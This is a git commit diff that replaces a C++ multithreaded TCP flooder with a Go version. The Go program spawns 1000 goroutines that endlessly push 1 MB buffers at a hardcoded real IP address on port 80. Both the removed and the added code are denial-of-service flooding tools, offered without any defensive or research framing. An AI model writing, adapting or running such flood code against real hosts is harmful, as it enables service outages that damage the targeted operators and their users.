b28a034a76c70df332c06ed6e2674588525334c7
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-10-19 13:41:06 +0600

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,61 +1,48 @@
-#include <boost/asio.hpp>
-#include <iostream>
-#include <vector>
-#include <thread>
+package main
 
-// Function that sends data to the server
-void sendData(const std::string& server_ip, unsigned short server_port) {
-    try {
-        boost::asio::io_service io_service;
-        boost::asio::ip::tcp::endpoint endpoint(boost::asio::ip::address::from_string(server_ip), server_port);
-        boost::asio::ip::tcp::socket socket(io_service);
+import (
+	"github.com/Allenxuxu/gev"
+	"github.com/Allenxuxu/gev/connection"
+	"log"
+	"sync"
+)
 
-        // Attempt to connect to the server and handle any errors
-        boost::system::error_code ec;
-        socket.connect(endpoint, ec);
-        if (ec) {
-            std::cerr << "Failed to connect to " << server_ip << ":" << server_port << ". Error: " << ec.message() << std::endl;
-            return;
-        }
-
-        std::vector<char> data(1024 * 1024, 0);  // 1MB of data
-
-        while (true) {
-            boost::system::error_code error;
-            socket.write_some(boost::asio::buffer(data), error);
-
-            if (error) {
-                std::cerr << "Error while sending data: " << error.message() << std::endl;
-                break;
-            }
-        }
-    } catch (const std::exception& e) {
-        std::cerr << "Exception in thread: " << e.what() << std::endl;
-    }
+type exampleClient struct {
+	data []byte
 }
 
-int main(int argc, char* argv[]) {
-    if (argc != 4) {
-        std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port> <num_threads>\n";
-        return 1;
-    }
+func (s *exampleClient) OnConnect(c *connection.Connection) {
+	log.Println("OnConnect")
+	c.Send(s.data)
+}
 
-    const std::string server_ip = argv[1];
-    const unsigned short server_port = std::stoi(argv[2]);
-    const unsigned int numThreads = std::stoi(argv[3]);
+func (s *exampleClient) OnMessage(c *connection.Connection, ctx interface{}, data []byte) (out []byte) {
+	log.Println("OnMessage")
+	return
+}
 
-    // Create a vector of threads
-    std::vector<std::thread> threads(numThreads);
+func (s *exampleClient) OnClose(c *connection.Connection) {
+	log.Println("OnClose")
+}
 
-    // Launch the threads
-    for (auto& t : threads) {
-        t = std::thread(sendData, server_ip, server_port);
-    }
+func main() {
+	data := make([]byte, 1024*1024) // 1 MB of data
+	var wg sync.WaitGroup
 
-    // Wait for all threads to finish
-    for (auto& t : threads) {
-        t.join();
-    }
+	for i := 0; i < 1000; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			client, err := gev.NewClient("193.228.196.49:80", &exampleClient{data: data}, nil)
+			if err != nil {
+				log.Fatalln("NewClient failed:", err)
+			}
 
-    return 0;
+			for {
+				client.Send(data)
+			}
+		}()
+	}
+
+	wg.Wait()
 }
